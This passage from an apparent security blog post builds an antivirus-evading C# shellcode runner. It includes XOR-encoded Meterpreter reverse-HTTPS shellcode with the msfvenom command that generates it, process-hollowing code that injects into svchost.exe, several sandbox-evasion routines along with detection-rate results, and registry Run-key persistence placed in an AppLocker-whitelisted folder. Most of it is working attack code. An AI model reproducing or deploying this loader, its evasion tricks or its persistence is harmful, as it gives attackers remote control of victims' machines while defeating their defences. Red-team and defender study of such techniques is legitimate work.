0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xe1, 0x55, 0x55, 0x55, 0xf7, 0xe2, 0x9b, 0x71, 0xf9, 0xe3, 0x14, 0xdd, 0xc3, 0xc4, 0xc3, 0xc4, 0xcf, 0xde, 0xaa, 0xeb, 0xfc, 0xe2, 0x23, 0x4b, 0xe3, 0x6d, 0x68, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xf9, 0xf9, 0xe2, 0x23, 0x4b, 0xf9, 0xf0, 0xe7, 0x9b, 0x6a, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xe3, 0x10, 0x90, 0xfc, 0xd3, 0x0d, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0x42, 0xa4, 0xaa, 0xaa, 0xaa, 0x9b, 0x93, 0x98, 0x84, 0x9b, 0x9c, 0x92, 0x84, 0x9b, 0x84, 0x98, 0x9a, 0x93, 0xaa, 0xf0, 0xe2, 0x23, 0x6b, 0xe3, 0x6d, 0x6a, 0x11, 0xab, 0xaa, 0xaa, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xc0, 0xa9, 0xf9, 0xe3, 0x10, 0xfd, 0x23, 0x35, 0x6c, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0x42, 0xd0, 0xaa, 0xaa, 0xaa, 0x85, 0xf9, 0xfd, 0xfb, 0xdf, 0xc9, 0xdb, 0xf3, 0x9f, 0xc8, 0x9a, 0xc5, 0xc7, 0xf9, 0xd3, 0xce, 0xe0, 0xfb, 0x9b, 0xeb, 0xda, 0xce, 0xcd, 0xed, 0xf9, 0xdd, 0xf2, 0xc3, 0xeb, 0xc8, 0xfa, 0xfa, 0xc0, 0x99, 0xe2, 0x98, 0x98, 0x9d, 0xe2, 0xc2, 0xe3, 0xfd, 0xeb, 0xf0, 0xff, 0xfd, 0xcc, 0xc3, 0xc5, 0xe8, 0x9c, 0xec, 0xde, 0xd3, 0xed, 0xdf, 0xe1, 0x87, 0xfb, 0xc4, 0xf2, 0xe4, 0xee, 0xee, 0xc3, 0xfd, 0xd3, 0x9f, 0xcb, 0x92, 0xdc, 0xf8, 0xe5, 0xe2, 0xde, 0xfd, 0xef, 0xce, 0xc8, 0xf2, 0xf5, 0xdd, 0xef, 0xc9, 0xfe, 0xfa, 0xe9, 0xe7, 0xf9, 0xf3, 0xc3, 0x9a, 0xec, 0xc8, 0xf2, 0xed, 0xf9, 0xfa, 0xd8, 0xcf, 0xc0, 0xfa, 0xe1, 0xf8, 0x9f, 0xdf, 0xe4, 0xf5, 0xe8, 0xfd, 0xfb, 0xf3, 0x98, 0xdc, 0xc5, 0xd0, 0x98, 0xfe, 0xfd, 0xe1, 0xd2, 0xaa, 0xe2, 0x23, 0x6b, 0xf9, 0xf0, 0xeb, 0xf2, 0xe7, 0x9b, 0x63, 0xf9, 0xe2, 0x12, 0xaa, 0x98, 0x02, 0x2e, 0xaa, 0xaa, 0xaa, 0xaa, 0xfa, 0xf9, 0xf9, 0xe3, 0x6d, 0x68, 0x41, 0xff, 0x84, 0x91, 0x55, 0x7f, 0xe2, 0x23, 0x6c, 0xc0, 0xa0, 0xf5, 0xe2, 0x23, 0x5b, 0xc0, 0xb5, 0xf0, 0xf8, 0xc2, 0x2a, 0x99, 0xaa, 0xaa, 0xe3, 0x23, 0x4a, 0xc0, 0xae, 0xeb, 0xf3, 0xe3, 0x10, 0xdf, 0xec, 0x34, 0x2c, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe7, 0x9b, 0x6a, 0xf9, 0xf0, 0xe2, 0x23, 0x5b, 0xe7, 0x9b, 0x63, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xe3, 0x6d, 0x68, 0x87, 0xac, 0xb2, 0xd1, 0x55, 0x7f, 0x2f, 0x6a, 0xdf, 0xb5, 0xe2, 0x6d, 0x6b, 0x22, 0xb9, 0xaa, 0xaa, 0xe3, 0x10, 0xee, 0x5a, 0x9f, 0x4a, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x55, 0x65, 0xde, 0xa8, 0x41, 0x00, 0x42, 0xff, 0xaa, 0xaa, 0xaa, 0xf9, 0xf3, 0xc0, 0xea, 0xf0, 0xe3, 0x23, 0x7b, 0x6b, 0x48, 0xba, 0xe3, 0x6d, 0x6a, 0xaa, 0xba, 0xaa, 0xaa, 0xe3, 0x10, 0xf2, 0x0e, 0xf9, 0x4f, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x39, 0xf9, 0xf9, 0xe2, 0x23, 0x4d, 0xe2, 0x23, 0x5b, 0xe2, 0x23, 0x70, 0xe3, 0x6d, 0x6a, 0xaa, 0x8a, 0xaa, 0xaa, 0xe3, 0x23, 0x53, 0xe3, 0x10, 0xb8, 0x3c, 0x23, 0x48, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x8a, 0x2f, 0x6a, 0xde, 0x18, 0xcc, 0x21, 0xad, 0xe2, 0xab, 0x69, 0x2f, 0x6a, 0xdf, 0x78, 0xf2, 0x69, 0xf2, 0xc0, 0xaa, 0xf3, 0x11, 0x4a, 0xb7, 0x80, 0xa0, 0xeb, 0x23, 0x70, 0x55, 0x7f };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            } 
```

Now, to scan the file once again:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/custom-xor-results-743x1024.png)

There is no change in detection rating when using a custom XOR encrypter for the payload.

Therefore, we will disregard our custom XOR encrypter and continue the rest of the testing with the XOR payload generated by MSFVenom.

Quite a few other things could be done to obfuscate this shellcode more, but I did not find it necessary in the end.

## Sandbox Evasion

Given that the attempts to bring down the detection rate by encrypting the payload were unsuccessful, it’s time we turned our attention towards sandbox evasion.

In the context of antivirus software, there is technically a difference between emulators and stand-alone sandboxes, but that is outside the scope of this post.

So, to keep things simple, I will use the terms “emulator” and “sandbox” interchangeably.

Modern antivirus software employs emulators or sandboxed environments when performing heuristic analysis.

Simply put, this means that each time our PE file is scanned, the antivirus will attempt to execute the program within an emulator to determine how the program behaves and if that behavior is malicious.

However, quite a few tricks can be used to bypass this emulation.

We will use several emulation evasion methods in this section and rate their efficacy.

### Keeping Things Tidy 🧹

To implement the sandbox evasion code without muddying my **Program.cs** file, I first created a new folder in the project directory in Visual Studio 2022 named **Modules**.

I then created a sub-directory called **Evasion**.

Now, to keep all of the emulation evasion code in one place, I created an external class named **Evasion.cs**.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/evasion-cs-ext-class.png)

### Implementing The Emulation Evasion Code

With the **Evasion.cs** external class created, I created several public methods within the class that each utilize a different emulation bypass technique.

The final version of the **Evasion.cs** code looked like this:

```csharp
using System;
using System.IO;
using System.Runtime.InteropServices;
namespace HollowGhost.Modules.Evasion
{
    internal class Evasion
    {
        //DLL Import Sleep for SleepTimer evasion code
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        //Method for SleepTimer to evade sandbox emulation
        public static void SleepTimer()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
        }
        // DLL import for VirtualAllocExNuma so we can use this Non Emulated API to aid in evasion
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        // We also need GetCurrentProcess for our VirtualAllocExNuma code
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        // DLL import for FlsAlloc so we can use this Non Emulated API to aid in evasion
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        // The below code uses 2 Non Emulated APIs to evade sandboxes
        public static void NonEmulatedAPIs()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }
        }
        // This fills 1 GB of memory to try to bypass sandbox emulation
        // Allocates a ~1.07GB byte array and zeroes it out, then checks if the last value is equal to 0. The theory is that an antivirus engine will forgo zeroing out all this memory, thus the program will quit before the shellcode runner can be examined.
        // https://github.com/cinzinga/Evasion-Practice
        // If priority is to bypass emulation you could leave it at 1 GB, but if priority is to avoid detection by blue team/end users, bring memory usage down to 100 MB so it doesn't stand out as much
        public static void FillMemoryBypass()
        {
            byte zeroVal = 1;
            byte[] evdata = new byte[32768 * 32768];
            Array.Clear(evdata, 0, evdata.Length);
            Console.WriteLine("~1GB filled!");
            System.Threading.Thread.Sleep(1000);
            byte lastVal = (byte)evdata.GetValue((32768 * 32768) - 1);
            if (lastVal.Equals(zeroVal))
            {
                return;
            }
        }
        // Perform for loop 900 million times, this is not a lot for a modern CPU but is enough to trick up an emulator, continue execution flow after complete
        public static void ManyIterations()
        {
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count == max)
            {
                return;
            }
        }
        // Code taken from: https://redfoxsecurity.medium.com/antivirus-evasion-26a30f072f76
        // Verify PE filename, sandboxes usually change the name of the EXE, here we check if the filename has been changed, if so, we stop execution
        public static void FilenameCheck()
        {
            string exename = "HollowGhost";
            if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
            {
                return;
            }
        }
    }
}
 
```

I found the majority of these emulation bypass techniques via this excellent paper by Emeric Nasi:

<https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf>

I was saved the work of converting these techniques to C# thanks to this GitHub repository:

<https://github.com/cinzinga/Evasion-Practice>

The file name check code I borrowed from this post by RedFox Security:

<https://redfoxsecurity.medium.com/antivirus-evasion-26a30f072f76>

With the methods set up in the **Evasion.cs** external class, we can now call them in the **Main** method of our **Program.cs** file.

First, make sure the namespace for **Evasion.cs** is imported:

```csharp
using HollowGhost.Modules.Evasion; 
```

Now, I call the public methods in **Main**:

```csharp
        static void Main(string[] args)
        {
            // Run sandbox/emulation evasion first before executing our shellcode
            // First check if the PE filename has been changed
            Evasion.FilenameCheck();
            // Use our Non Emulated APIs to mess up emulator
            Evasion.NonEmulatedAPIs();
            // Run the Sleep Timer, if time lapse is less that 1.5 seconds probably in emulator, so we exit before executing shellcode
            Evasion.SleepTimer();
            // Run memory fill to evade evasion
            Evasion.FillMemoryBypass();
            // Perform many iterations of for loop, 900 million, to trip up emulator
            Evasion.ManyIterations();
            // After evasion is performed we finally call the runner
            Run();
        } 
```

I know what you may be thinking: “*Why the hell do you need that much sandbox evasion?*”

Well, I don’t, and neither do you.

Eventually, this will be narrowed down to one technique.

Before we test each one, I have a confession to make…

During this point in my testing, I added an extra bit of code for persistence.

My goal at the time was to have this shellcode runner not only undetectable but also persistent.

This later came back to bite me in the ass, and I will show that. 😅

But just so we are all on the same page regarding the detection results, I thought I should tell you.

### Persistence Is Key 🔑

Just as before, I created an external class aptly named **Persistence.cs**:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/persistence-cs-ext-class.png)

The code contained in this external class writes to the registry, creating a new registry key value that will cause the HollowGhost.exe file to be executed at startup:

```csharp
using Microsoft.Win32;
using System.IO;
namespace HollowGhost.Modules.Persistence
{
    internal class Persistence
    {
        public static void ExecOnStartup()
        {
            // startup
            // define the path to the file you want to execute on startup
            string filePath = @"C:WindowsTasksHollowGhost.exe";
            // add the file to the registry key to execute on startup
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue(Path.GetFileNameWithoutExtension(filePath), filePath);
        }
    }
}
 
```

I set the file path to execute the PE file from within “C:WindowsTasks” since this directory is often whitelisted by AppLocker on Windows systems.

Import the namespace in **Program.cs**:

```csharp
using HollowGhost.Modules.Persistence; 
```

I then implemented the call to the **ExecOnStartup()** method.

However, you may have noticed earlier that the shellcode runner code is no longer in the **Main** method.

That is because I wanted a separate method in **Program.cs** to carry out the process hollowing and run the shellcode.

So, I created a new method called **Run**.

This is where the call to **ExecOnStartup()** will be stored, only being called after the process hollowing has occurred:

```csharp
        static void Run()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\Windows\System32\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            // Generate XOR shellcode with MSFVenom: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d 'nr'
            byte[] buf = new byte[804] { 0x86, 0x32, 0xf9, 0x9e, 0x8a, 0x92, 0xb6, 0x7a, 0x7a, 0x7a, 0x3b, 0x2b, 0x3b, 0x2a, 0x28, 0x32, 0x4b, 0xa8, 0x2b, 0x1f, 0x32, 0xf1, 0x28, 0x1a, 0x32, 0xf1, 0x28, 0x62, 0x2c, 0x32, 0xf1, 0x28, 0x5a, 0x32, 0xf1, 0x08, 0x2a, 0x32, 0x75, 0xcd, 0x30, 0x30, 0x37, 0x4b, 0xb3, 0x32, 0x4b, 0xba, 0xd6, 0x46, 0x1b, 0x06, 0x78, 0x56, 0x5a, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x98, 0x97, 0x28, 0x3b, 0x2b, 0x32, 0xf1, 0x28, 0x5a, 0xf1, 0x38, 0x46, 0x32, 0x7b, 0xaa, 0x1c, 0xfb, 0x02, 0x62, 0x71, 0x78, 0x75, 0xff, 0x08, 0x7a, 0x7a, 0x7a, 0xf1, 0xfa, 0xf2, 0x7a, 0x7a, 0x7a, 0x32, 0xff, 0xba, 0x0e, 0x1d, 0x32, 0x7b, 0xaa, 0x2a, 0xf1, 0x32, 0x62, 0x3e, 0xf1, 0x3a, 0x5a, 0x33, 0x7b, 0xaa, 0x99, 0x2c, 0x32, 0x85, 0xb3, 0x37, 0x4b, 0xb3, 0x3b, 0xf1, 0x4e, 0xf2, 0x32, 0x7b, 0xac, 0x32, 0x4b, 0xba, 0x3b, 0xbb, 0xb3, 0x77, 0xd6, 0x3b, 0x7b, 0xbb, 0x42, 0x9a, 0x0f, 0x8b, 0x36, 0x79, 0x36, 0x5e, 0x72, 0x3f, 0x43, 0xab, 0x0f, 0xa2, 0x22, 0x3e, 0xf1, 0x3a, 0x5e, 0x33, 0x7b, 0xaa, 0x1c, 0x3b, 0xf1, 0x76, 0x32, 0x3e, 0xf1, 0x3a, 0x66, 0x33, 0x7b, 0xaa, 0x3b, 0xf1, 0x7e, 0xf2, 0x32, 0x7b, 0xaa, 0x3b, 0x22, 0x3b, 0x22, 0x24, 0x23, 0x20, 0x3b, 0x22, 0x3b, 0x23, 0x3b, 0x20, 0x32, 0xf9, 0x96, 0x5a, 0x3b, 0x28, 0x85, 0x9a, 0x22, 0x3b, 0x23, 0x20, 0x32, 0xf1, 0x68, 0x93, 0x31, 0x85, 0x85, 0x85, 0x27, 0x32, 0x4b, 0xa1, 0x29, 0x33, 0xc4, 0x0d, 0x13, 0x14, 0x13, 0x14, 0x1f, 0x0e, 0x7a, 0x3b, 0x2c, 0x32, 0xf3, 0x9b, 0x33, 0xbd, 0xb8, 0x36, 0x0d, 0x5c, 0x7d, 0x85, 0xaf, 0x29, 0x29, 0x32, 0xf3, 0x9b, 0x29, 0x20, 0x37, 0x4b, 0xba, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xc0, 0x40, 0x2c, 0x03, 0xdd, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x74, 0x7a, 0x7a, 0x7a, 0x4b, 0x43, 0x48, 0x54, 0x4b, 0x4c, 0x42, 0x54, 0x4b, 0x54, 0x48, 0x4a, 0x43, 0x7a, 0x20, 0x32, 0xf3, 0xbb, 0x33, 0xbd, 0xba, 0xc1, 0x7b, 0x7a, 0x7a, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x10, 0x79, 0x29, 0x33, 0xc0, 0x2d, 0xf3, 0xe5, 0xbc, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x80, 0x7a, 0x7a, 0x7a, 0x55, 0x18, 0x0e, 0x2f, 0x08, 0x2a, 0x4e, 0x29, 0x36, 0x11, 0x1f, 0x1e, 0x17, 0x4f, 0x17, 0x1c, 0x11, 0x3b, 0x57, 0x4d, 0x1e, 0x31, 0x1d, 0x4a, 0x19, 0x37, 0x0d, 0x3d, 0x38, 0x2f, 0x28, 0x30, 0x00, 0x0b, 0x22, 0x08, 0x19, 0x2e, 0x3b, 0x4e, 0x3e, 0x1e, 0x0d, 0x29, 0x1e, 0x1f, 0x3c, 0x29, 0x2e, 0x2c, 0x43, 0x3c, 0x3f, 0x2e, 0x30, 0x2f, 0x1e, 0x3d, 0x0b, 0x32, 0x3f, 0x35, 0x57, 0x39, 0x1b, 0x13, 0x10, 0x43, 0x19, 0x35, 0x37, 0x0b, 0x4e, 0x09, 0x16, 0x17, 0x02, 0x16, 0x4c, 0x28, 0x4a, 0x30, 0x30, 0x2f, 0x31, 0x28, 0x3f, 0x4f, 0x19, 0x33, 0x12, 0x0e, 0x25, 0x2b, 0x4d, 0x2f, 0x39, 0x1f, 0x1b, 0x3d, 0x48, 0x0d, 0x02, 0x4a, 0x2b, 0x2d, 0x3d, 0x16, 0x28, 0x4a, 0x57, 0x57, 0x22, 0x10, 0x4c, 0x16, 0x3d, 0x4a, 0x1b, 0x0a, 0x14, 0x02, 0x00, 0x03, 0x08, 0x0b, 0x29, 0x35, 0x3c, 0x08, 0x25, 0x4e, 0x12, 0x0c, 0x3e, 0x2b, 0x0a, 0x29, 0x2e, 0x33, 0x19, 0x1c, 0x2e, 0x11, 0x4b, 0x4a, 0x33, 0x17, 0x2c, 0x11, 0x34, 0x29, 0x25, 0x12, 0x0f, 0x2b, 0x4a, 0x57, 0x57, 0x15, 0x28, 0x3f, 0x11, 0x37, 0x1e, 0x49, 0x03, 0x0e, 0x4e, 0x43, 0x16, 0x1f, 0x42, 0x17, 0x31, 0x49, 0x3b, 0x4f, 0x02, 0x4d, 0x2e, 0x10, 0x35, 0x2e, 0x0c, 0x3c, 0x13, 0x20, 0x2b, 0x17, 0x10, 0x4f, 0x29, 0x12, 0x19, 0x11, 0x16, 0x37, 0x1c, 0x08, 0x39, 0x2d, 0x32, 0x48, 0x3e, 0x39, 0x4c, 0x03, 0x4b, 0x2f, 0x39, 0x1f, 0x22, 0x1c, 0x08, 0x1d, 0x0a, 0x03, 0x30, 0x1f, 0x02, 0x16, 0x29, 0x3d, 0x16, 0x08, 0x00, 0x39, 0x0f, 0x1d, 0x18, 0x35, 0x09, 0x25, 0x19, 0x25, 0x48, 0x0a, 0x2d, 0x22, 0x13, 0x42, 0x0a, 0x0b, 0x0e, 0x09, 0x25, 0x43, 0x2d, 0x7a, 0x32, 0xf3, 0xbb, 0x29, 0x20, 0x3b, 0x22, 0x37, 0x4b, 0xb3, 0x29, 0x32, 0xc2, 0x7a, 0x48, 0xd2, 0xfe, 0x7a, 0x7a, 0x7a, 0x7a, 0x2a, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0x91, 0x2f, 0x54, 0x41, 0x85, 0xaf, 0x32, 0xf3, 0xbc, 0x10, 0x70, 0x25, 0x32, 0xf3, 0x8b, 0x10, 0x65, 0x20, 0x28, 0x12, 0xfa, 0x49, 0x7a, 0x7a, 0x33, 0xf3, 0x9a, 0x10, 0x7e, 0x3b, 0x23, 0x33, 0xc0, 0x0f, 0x3c, 0xe4, 0xfc, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x37, 0x4b, 0xba, 0x29, 0x20, 0x32, 0xf3, 0x8b, 0x37, 0x4b, 0xb3, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0x57, 0x7c, 0x62, 0x01, 0x85, 0xaf, 0xff, 0xba, 0x0f, 0x65, 0x32, 0xbd, 0xbb, 0xf2, 0x69, 0x7a, 0x7a, 0x33, 0xc0, 0x3e, 0x8a, 0x4f, 0x9a, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0x85, 0xb5, 0x0e, 0x78, 0x91, 0xd0, 0x92, 0x2f, 0x7a, 0x7a, 0x7a, 0x29, 0x23, 0x10, 0x3a, 0x20, 0x33, 0xf3, 0xab, 0xbb, 0x98, 0x6a, 0x33, 0xbd, 0xba, 0x7a, 0x6a, 0x7a, 0x7a, 0x33, 0xc0, 0x22, 0xde, 0x29, 0x9f, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xe9, 0x29, 0x29, 0x32, 0xf3, 0x9d, 0x32, 0xf3, 0x8b, 0x32, 0xf3, 0xa0, 0x33, 0xbd, 0xba, 0x7a, 0x5a, 0x7a, 0x7a, 0x33, 0xf3, 0x83, 0x33, 0xc0, 0x68, 0xec, 0xf3, 0x98, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xf9, 0xbe, 0x5a, 0xff, 0xba, 0x0e, 0xc8, 0x1c, 0xf1, 0x7d, 0x32, 0x7b, 0xb9, 0xff, 0xba, 0x0f, 0xa8, 0x22, 0xb9, 0x22, 0x10, 0x7a, 0x23, 0xc1, 0x9a, 0x67, 0x50, 0x70, 0x3b, 0xf3, 0xa0, 0x85, 0xaf };
            //// XOR decrypt, key is set to z
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            }
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
            // After shellcode execution run startup persistence
            Persistence.ExecOnStartup();
        } 
```

During my research, I did suspect that obtaining persistence through registry modification would likely increase the detection rate.

There are stealthier ways of achieving persistence, but I wanted a simple solution.

In the future, I may modify the shellcode runner to be persistent without writing to the registry, but that’s a project for a different day.

### Testing the Emulator Bypasses

I began by testing the version of the PE containing all of the emulator bypass techniques:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/all-sandbox-evasion-results-746x1024.png)

We are down to a detection rating of 10/40 versus the 15/40 rating for the previous version without sandbox evasion.

Notably, the sandbox evasion techniques managed to outsmart Avast, Avira, AVG, Norman, and VirusFighter.

Let’s continue by testing each individual emulator bypass.

#### Filename Check Bypass

The first technique I tested was the filename check.

How does this bypass work?

When antivirus software attempts to run the program in a sandboxed environment, it often changes the filename.

Therefore, by implementing code to check if the filename has been changed, we can determine if the program is being run within a sandbox.

If the filename changes, the program terminates before reaching the **Run** method responsible for the process hollowing.

Since the malicious portion of the code is never executed within the sandbox, the file appears to be clean to the antivirus.

So what are the results?

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/filename-check-results-746x1024.png)

#### Non-Emulated APIs Bypass

The second technique I tested was using non-emulated APIs.

How does this bypass work?

When our program is executed within an emulator by the antivirus, the sandbox attempts to mimic the native operating system.

However, some of the less common Win32 APIs are not properly emulated within the sandbox environment.

Two Win32 APIs which are notoriously hard for antivirus to emulate are **VirtualAllocExNuma** and **FlsAlloc**.

These were the APIs I chose to employ in my bypass.

In the **NonEmulatedAPIs()** method shown above, **VirtualAllocExNuma** allocates a region of memory in the address space of the current process.

The **FlsAlloc** function allocates a new FLS index. FLS is a feature in Windows for associating thread-specific data with a fiber (a lightweight thread).

After each API call, there’s a check to see if the returned value is equal to **IntPtr.Zero**, which indicates that the allocation failed. If allocation fails for either **VirtualAllocExNuma** or **FlsAlloc**, the we exit early without performing any further actions.

Since the sandbox is not able to properly emulate these APIs, the allocation will always fail.

Therefore, the malicious code remains undetected.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/non-emulated-apis-results-746x1024.png)

#### Sleep Timer Bypass

One of the oldest heuristics bypasses in the book is sleep timers.

How does this bypass work?

When our program is executed within the emulator, and the heuristics engine encounters a sleep instruction, it will “fast forward” through the delay to the point where the application resumes execution.

Since we know that the emulator will attempt to “fast forward” through this sleep delay, we can abuse this to construct a bypass.

By using the **DateTime** object with the **Now** method to retrieve the local system’s current date and time and then comparing that to the amount of time elapsed, we can determine if the entire two seconds that we set our sleep timer to delay has fully elapsed or if it has completed earlier than expected.

If the time lapse is less than 1.5 seconds, we can assume that the call was emulated and exit before the malicious code is reached.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/sleep-timer-results-746x1024.png)

#### Fill Memory Bypass

This bypass works by allocating a large portion of memory by filling it with a 1 GB byte array and then attempting to zero out the memory allocated.

The theory is that the emulator will forgo zeroing out this large allocation of memory, thus ceasing execution before reaching the malicious portion of the program.

Depending on the use case for this technique, if you are not worried about detection due to system monitoring, you could leave it at 1 GB.

If you are more interested in staying hidden from system monitoring or sysadmins that may pick up on the large amount of memory that this will cause the shellcode runner to use, I suggest reducing it to 100 MB of memory.

As a svchost.exe process, utilizing 1 GB of memory on a Windows system will stick out like a sore thumb, so modify this as you see fit.

100 MB of memory is more than enough to screw up the emulator.

However, I must say that svchost.exe, using even 100 MB of memory on the bare-metal host, will likely raise some eyebrows as well, so that is the main caveat of this technique.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/fill-memory-results-746x1024.png)

#### Many Iterations Bypass

The last emulation bypass technique I tested with this variant of shellcode runner was the “Many Iterations” technique.

This technique utilizes a for loop to perform a basic operation nine hundred million times.

While this number may seem high, this is nothing for a modern CPU to handle and will not even cause a noticeable delay when executing the shellcode runner.

However, this level of operation *is* quite taxing for an emulator to perform.

Since the emulator cannot handle this, it will often keep the heuristics engine from emulating the rest of the program, thus keeping the malicious portion of the code from being analyzed.

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/many-iterations-results-746x1024.png)

#### And Then There Was One…​​​

As you can see, each sandbox evasion technique I employed with this variant of shellcode runner produced the same detection rating.

All of these bypasses were effective in evading Avast, Avira, AVG, Norman, and VirusFighter.

From these results, I inferred that these antivirus vendors were relatively weak to emulation bypasses.

Therefore, if you are on an engagement where the target environment employs one of these antivirus solutions, sandbox evasion may help you. 😉

However, in my case, this would only get me a little bit closer on my path to FUD.

Given that each technique appeared equally effective, I determined I would employ just one sandbox evasion technique in my program.

In my scenario, I wanted an effective sandbox evasion technique while reducing the use of Win32 APIs or any other extraneous functionality that might give an AV engine reason to raise the red flag.

I also wanted something that would not consume a large amount of system resources, such as the “Fill Memory” technique, to not stand out to end-users or system monitors.

Therefore, I settled on using the “Many Iterations” technique.

My favorite thing about this technique is that it does not rely on directly interacting with low-level memory management or external resources like Win32 APIs.

Since this managed code simply uses standard C# constructs, such as variables, loops, and conditional statements, we decrease the odds of the AV engine detecting us.

The **ManyIterations()** method contains a loop that iterates max times and increments the count variable in each iteration. After the loop, it checks whether the count variable is equal to max and returns if the condition is met.

```csharp
int count = 0; 
```

Initializes a variable named `count` to 0.

```csharp
int max = 900000000; 
```

Initializes a variable named `max` to 900,000,000.

```csharp
for (int i = 0; i < max; i++) 
```

Starts a `for` loop that iterates from `i = 0` to `i < max`, which means it will run `max` times.

Inside the loop, `count++;` increments the `count` variable by 1 in each iteration.

```csharp
            for (int i = 0; i < max; i++)
            {
                count++;
            } 
```

After the loop, there’s an `if` statement: `if (count == max)`.

It checks whether the `count` variable is equal to `max`.

```csharp
            if (count == max)
            {
                return;
            } 
```

If the condition in the `if` statement is true (i.e., if the loop completed `max` iterations), it returns from the method using `return;`. This implies that the method will terminate when `count` becomes equal to `max`.

In short, if the loop completed `max` iterations, we assume we are not in an emulator and continue execution.

If the loop does not complete `max` iterations, we do not continue execution.

Since the emulator will never complete all of the iterations, it will never return, thus causing the evil portion of the code to never be analyzed.

After deciding to use only the “Many Iterations” technique, I exported the project template from the original “HollowGhost” program and created a new version containing only this bypass technique.

So in the new project, with the very unique name “HollowGhost2”, the **Evasion.cs** class code now looks like this:

```csharp
namespace HollowGhost2.Modules.Evasion
{
    internal class Evasion
    {
        // Perform for loop 900 million times, this is not a lot for a modern CPU but is enough to trick up an emulator, continue execution flow after complete
        public static void ManyIterations()
        {
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count == max)
            {
